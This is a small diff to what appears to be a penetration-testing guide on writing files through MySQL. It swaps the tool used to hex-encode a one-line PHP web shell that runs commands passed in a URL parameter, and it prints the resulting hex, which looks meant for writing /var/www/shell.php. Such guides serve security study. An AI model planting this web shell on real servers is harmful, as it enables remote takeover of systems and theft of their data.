@@ -219,7 +219,7 @@ Can't create/write to file '/var/www/shell.php' (Errcode: 13 "Permission denied"
 - You can of course encode it with hexadecimal.
 
 ```bash
-$ echo -n "<?php system(\$_GET['cmd']); ?>" | hexdump -ve '/1 "%02x"' | sed 's/^/0x/'
+$ echo -n "<?php system(\$_GET['cmd']); ?>" | od -A n -t x1 -v | tr -d " \n" | sed 's/^/0x/'
 0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e
 ```
 
